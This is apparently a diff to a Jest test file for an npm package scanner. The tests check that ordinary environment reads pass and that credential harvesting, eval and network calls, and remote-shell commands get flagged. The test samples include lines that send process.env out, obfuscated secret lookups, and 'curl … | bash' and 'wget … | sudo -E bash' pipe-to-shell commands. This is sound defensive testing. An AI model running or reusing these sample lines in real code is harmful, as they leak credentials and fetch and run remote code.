@@ -643,8 +643,162 @@ describe("review", () => {
     ).toEqual([]);
     expect(credentialFindings("const java = process.env['JAVA_HOME'];\n")).toEqual([]);
     expect(credentialFindings("const g = process.env.GRADLE_USER_HOME;\n")).toEqual([]);
-    expect(credentialFindings("const home = process.env.HOME;\n")).toHaveLength(1);
+    expect(credentialFindings("const home = process.env.HOME;\n")).toEqual([]);
     expect(credentialFindings("const t = process.env.NPM_TOKEN_HOMEPAGE;\n")).toHaveLength(1);
+  });
+
+  test("reads of named configuration variables are not credential access", () => {
+    const credentialFindings = (textSample, path = "index.js") => {
+      const staged = [{ path, size: textSample.length, sha256: "cfg", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
+        (finding) => finding.ruleId === "code.credential-access",
+      );
+    };
+
+    for (const textSample of [
+      "if (process.env.NAPI_RS_NATIVE_LIBRARY_PATH) load(process.env.NAPI_RS_NATIVE_LIBRARY_PATH);\n",
+      "const port = process.env.PORT || 1234;\nprocess.env.PATH = `${bin}:${process.env.PATH}`;\n",
+      "const dir = process.env['XDG_RUNTIME_DIR'] ?? process.env.DOCKER_CONFIG;\n",
+      "const proxy = process.env.npm_config_https_proxy || process.env.npm_config_user_agent;\n",
+      "const { APPDATA = join(home, 'AppData'), OSTYPE } = process.env;\n",
+      "const a = process.env.GIT_AUTHOR_NAME, t = process.env.TOKENIZERS_PARALLELISM, k = process.env.KEYBOARD_LAYOUT;\n",
+      "const flag = process.env.NEXT_PRIVATE_LOCAL_DEV || process.env.GITHUB_ACTIONS || process.env.PWD;\n",
+      "// process.env.PACKAGE_VERSION is injected when we publish.\nmodule.exports = 1;\n",
+      "/**\n * @param {Record<string, string>} processEnv process.env object\n */\nmodule.exports = (env) => env;\n",
+      // Handing the whole environment to a child or a config loader reads nothing.
+      "spawn(cmd, args, { env: { ...process.env, FORCE_COLOR: '1' } });\n",
+      "const env = { ...process.env };\nconst cfg = loadConfig(process.env);\nfunction f(e = process.env) { return e.CI; }\n",
+      // An environment alias in a bundle that also carries public names
+      // shaped like secrets (React internals, Babel tables, terminal ids).
+      "const env = process.env;\nconst wt = !!env.WT_SESSION || !!env.TERM_SESSION_ID;\nexports.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = W;\nif (_index.ALIAS_KEYS[t] || VISITOR_KEYS[t] || BUILDER_KEYS[t]) x();\n",
+    ]) {
+      expect(credentialFindings(textSample), textSample).toEqual([]);
+    }
+  });
+
+  test("still flags secret-shaped, computed, harvested and aliased environment reads", () => {
+    const credentialFindings = (textSample) => {
+      const staged = [
+        { path: "index.js", size: textSample.length, sha256: "s", flags: [], textSample },
+      ];
+      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
+        (finding) => finding.ruleId === "code.credential-access",
+      );
+    };
+
+    for (const textSample of [
+      "const k = process.env.OPENAI_API_KEY;\n",
+      "const k = process.env['STRIPE_SECRET'];\n",
+      "const k = process?.env?.CI_JOB_TOKEN;\n",
+      "const k = import.meta.env.VITE_SUPABASE_KEY;\n",
+      "const { AWS_REGION } = process.env;\n",
+      "const t = process.env.npm_config__auth;\n",
+      'const t = process.env["npm_config_//registry.npmjs.org/:_authToken"];\n',
+      "const t = Deno.env.get('GH_PAT');\n",
+      "const v = process.env[name];\n",
+      "const v = process.env[`NPM_${kind}`];\n",
+      "const v = globalThis.process[key];\n",
+      "const v = process.env['NPM_' + 'TOKEN'];\n",
+      "send(JSON.stringify(process.env));\n",
+      "for (const k in process.env) out[k] = 1;\n",
+      "const all = Object.entries(process.env);\n",
+      "post(url, { body: { ...process.env } });\n",
+      "req.end(process.env);\n",
+      "module.exports = process.env;\n",
+      "const env = process.env;\nconst key = env.ANTHROPIC_API_KEY;\n",
+      "const e = process.env;\nhttps.request(u).end(JSON.stringify(e));\n",
+      "const v = globalThis['proc' + 'ess']['e' + 'nv'];\n",
+    ]) {
+      expect(credentialFindings(textSample), textSample).toHaveLength(1);
+    }
+  });
+
+  test("network and eval patterns ignore comments and code emitted as strings", () => {
+    const ruleIds = (textSample, path = "lib/index.js") => {
+      const staged = [{ path, size: textSample.length, sha256: "c", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).map(
+        (finding) => finding.ruleId,
+      );
+    };
+
+    expect(
+      ruleIds(
+        "/**\n * import { createServer } from 'node:http';\n */\n// fetch() leaves them alone\nconst x = 1; /* XMLHttpRequest */\n",
+      ),
+    ).toEqual([]);
+    expect(
+      ruleIds(
+        'const code = ["WebAssembly.compile(bytes)", "eval()"];\nclass Node { eval(context) { return this; } }\n' +
+          "const load = new Function('specifier', 'return import(specifier)');\n" +
+          "const vite = new Function('return import(\"vite\")');\n" +
+          "exports.P = new Function('return this;')().Promise;\n",
+      ),
+    ).toEqual([]);
+    // Template text around a substitution, and literals inside one, are data.
+    expect(
+      ruleIds(
+        "const src = `eval(${JSON.stringify(code)} + ${'\\n//# sourceURL=x'})`;\n" +
+          'const wasm = `.then(${rt.returningFunction("WebAssembly.compile(bytes)", "bytes")})`;\n',
+      ),
+    ).toEqual([]);
+    // The same text in a non-JavaScript file is not lexed, so nothing is blanked.
+    expect(ruleIds("# fetch('https://example.invalid')\n", "scripts/run.sh")).toContain(
+      "code.network-access",
+    );
+    // Annex B HTML-like comments are code in module source and stay visible.
+    expect(ruleIds("if (a <!--b) fetch('https://example.invalid');\n", "lib/index.mjs")).toContain(
+      "code.network-access",
+    );
+    for (const textSample of [
+      "if (!fetch(url)) {\n}\n",
+      "if (eval(code)) {\n}\n",
+      "eval(code)\n{ }\n",
+      "const f = new Function(`var callback = ${source}`);\n",
+      "const f = new Function('a', 'return import(a); fetch(a)');\n",
+      'setTimeout("eval(atob(p))");\n',
+      // Substitution bodies are code, however the template nests or quotes braces.
+      "const s = `${eval(p)}`;\n",
+      "const s = `a${`b${new Function(p)()}`}`;\n",
+      "const s = `${'}'}${eval(p)}`;\n",
+      "const s = `${{ a: '`' }.a}${eval(p)}`;\n",
+    ]) {
+      expect(ruleIds(textSample), textSample).toEqual(
+        expect.arrayContaining([
+          expect.stringMatching(/^code\.(?:network-access|dynamic-evaluation)$/),
+        ]),
+      );
+    }
+  });
+
+  test("shell keyword lists and prose are not remote shell commands", () => {
+    const remoteShell = (textSample) => {
+      const staged = [{ path: "lib/grammar.js", size: 1, sha256: "g", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
+        (finding) => finding.ruleId === "code.remote-shell",
+      );
+    };
+
+    expect(
+      remoteShell(
+        "const { spawn } = require('child_process');\n" +
+          "const builtin = /(^|[\\s;|&])(?:awk|bash|cat|curl|cut|wget|which|zsh)(?=$|[)\\s;|&])/;\n" +
+          "const keywords = 'cat cd cp curl cvpa dbp echo|0 wget where';\n" +
+          "log('curl is required; retry with `vercel curl <url>`');\n",
+      ),
+    ).toEqual([]);
+    for (const textSample of [
+      "execSync('curl -fsSL https://example.invalid/i | bash');\n",
+      "execSync('curl ${IFS}https://example.invalid/i|sh');\n",
+      "execSync(`wget -qO- ${url} | sudo -E bash`);\n",
+      "const cmd = 'curl https://example.invalid/i | base64 -d | sh';\n",
+    ]) {
+      expect(remoteShell(textSample), textSample).toEqual([
+        expect.objectContaining({ severity: "critical" }),
+      ]);
+    }
+    expect(
+      remoteShell("require('child_process').exec('curl example.invalid/x -o /tmp/x');\n"),
+    ).toEqual([expect.objectContaining({ severity: "high" })]);
   });
 
   test("still flags aliased, enumerated and presence-then-read environment access", () => {
